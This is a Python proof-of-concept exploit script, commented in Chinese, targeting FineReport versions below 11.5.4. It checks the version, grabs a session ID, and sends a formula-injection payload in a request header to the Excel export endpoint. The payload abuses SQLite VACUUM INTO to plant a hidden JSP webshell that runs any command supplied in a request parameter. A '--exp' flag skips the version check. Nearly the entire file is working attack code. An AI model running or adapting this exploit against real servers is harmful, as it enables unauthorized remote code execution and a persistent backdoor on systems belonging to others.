#!/usr/bin/env python
# -*- coding: utf-8 -*-
import requests
from urllib.parse import urljoin, quote
import json
import argparse
 
poc_xml = """<test>
<LargeDatasetExcelExportJS dsName="XX" colNames="{}">
<Parameters>
<Parameter>
<Attributes name="aaa"/>
<O t="Formula"><Attributes>sql('FRDemo',"VACUUM into ('FRDemo2.db')",1)-sql('FRDemo',"pragma writable_schema=on",1)-sql('FRDemo',"delete from sqlite_schema",1)-sql('FRDemo',"create table a(u text)",1)-sql('FRDemo',"replace into a values(${webshell_data})",1)-sql('FRDemo',"COMMIT",1)-sql('FRDemo',"VACUUM into ('"+JOINARRAY([ENV_HOME,'/../.x.jsp'],'')+"')",1)</Attributes></O>
</Parameter>
</Parameters></LargeDatasetExcelExportJS></test>"""
 
webshell_data = """<%
if ("password".equals(request.getParameter("pwd"))) {
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while ((a = in.read(b)) != -1) {
        out.print(new String(b));
    }
    out.print("</pre>");
}%>"""
 
def build_payload():
    """
    构造攻击所需的 payload。
    """
    webshell_data_encode_list = []
    for i in webshell_data:
        webshell_data_encode_list.append(f"char({str(ord(i))})")
    webshell_data_encode = "||".join(webshell_data_encode_list)
    payload = quote(poc_xml.replace("${webshell_data}", webshell_data_encode))
    return payload
 
def check_version(base_url):
    """
    检查目标版本是否可能存在漏洞。
    """
    version_url = urljoin(base_url, "/webroot/decision/system/info")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
    }
    try:
        print(f"[*] 正在从 {version_url} 检查版本号...")
        response = requests.get(version_url, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            data = json.loads(response.text)
            version_info = data.get("data", {}).get("versionInfo", [{}])[0]
            current_version_str = version_info.get("minorVersion")
 
            if not current_version_str:
                print("[-] 未能在响应中找到版本号。")
                return False
 
            print(f"[+] 获取到版本号: {current_version_str}")
             
            target_version_str = "11.5.4"
             
            try:
                current_version_tuple = tuple(map(int, current_version_str.split('.')))
                target_version_tuple = tuple(map(int, target_version_str.split('.')))
            except (ValueError, TypeError):
                print(f"[!] 版本号格式不正确: {current_version_str}")
                return False
 
            if current_version_tuple < target_version_tuple:
                print(f"[+] 版本 {current_version_str} 低于 {target_version_str}，存在漏洞。")
                return True
            else:
                print(f"[-] 版本 {current_version_str} 不低于 {target_version_str}，不存在漏洞。")
                return False
        else:
            print(f"[!] 无法访问版本信息页面，状态码: {response.status_code}")
            return False
    except requests.exceptions.RequestException as e:
        print(f"[!] 检查版本时发生错误: {e}")
        return False
 
def get_session_id(base_url):
    """
    第一步: 获取 sessionID
    """
    # 构造获取 sessionID 的 URL
    get_session_path = "/webroot/decision/v10/session/cross/origin?reportlets=%5b%7b%22%72%65%70%6f%72%74%6c%65%74%22%3a%22%2f%22%7d%5d"
    get_session_url = urljoin(base_url, get_session_path)
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
    }
 
    try:
        print(f"[*] 正在从 {get_session_url} 获取 sessionID...")
        response = requests.get(get_session_url, headers=headers, timeout=10, verify=False, allow_redirects=False)
         
        if response.status_code == 200:
            session_id = response.text.strip()
            if session_id:
                print(f"[+] 成功获取 sessionID: {session_id}")
                return session_id
            else:
                print("[!] 未能在响应中找到 sessionID")
                return None
        else:
            print(f"[!] 获取 sessionID 失败，状态码: {response.status_code}")
            return None
 
    except requests.exceptions.RequestException as e:
        print(f"[!] 获取 sessionID 时发生错误: {e}")
        return None
 
 
def attack(base_url, session_id):
    """
    第二步: 使用获取到的 sessionID 发起攻击
    """
    attack_path = "/webroot/decision/nx/report/v9/largedataset/export/excel"
    attack_url = urljoin(base_url, attack_path)
     # 将 sessionID 添加到 headers 中
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        'sessionID': session_id
    }
     
    # 构造 payload
    params = {
        "functionParams" : "{\"test\":\"a\"}",
        "__parameters__" : "{\"test\":\"a\"}"
    }
    payload = build_payload()
    headers.update({"params": payload})
 
    try:
        print(f"[*] 正在向 {attack_url} 发起攻击...")
        response_attack = requests.get(attack_url, headers=headers, params=params, verify=False)
 
        # 根据响应检查漏洞是否存在
        # 请将 "some_indicator" 替换为实际的漏洞指示符
        if response_attack.status_code == 200:
            print(f"[+] 攻击成功: {attack_url}")
            return True
        else:
            print(f"[-] 攻击失败: {attack_url}")
            return False
 
    except requests.exceptions.RequestException as e:
        print(f"[!] 攻击时发生错误: {e}")
        return False
 
def poc(url, exp=False):
    """
    POC 协调函数
    """
    # 确保 base_url 以 '/' 结尾，以便 urljoin 能正确工作
    base_url = url if url.endswith('/') else url + '/'
     
    if not exp:
        if not check_version(base_url):
            print("[-] 目标版本似乎不受此漏洞影响，或者无法确定版本。")
            return
    else:
        print("[*] 已使用 --attack 参数，跳过版本检查。")
 
    session_id = get_session_id(base_url)
    if session_id:
        attack(base_url, session_id)
 
def main():
    """
    主函数，用于解析参数并运行 POC。
    """
    parser = argparse.ArgumentParser(description='FineReport POC')
    parser.add_argument('url', help='目标 URL, 例如 http://example.com')
    parser.add_argument('--exp', action='store_true', help='跳过版本检查，直接进行攻击')
    args = parser.parse_args()
 
    poc(args.url, args.exp)
 
if __name__ == "__main__":
    main()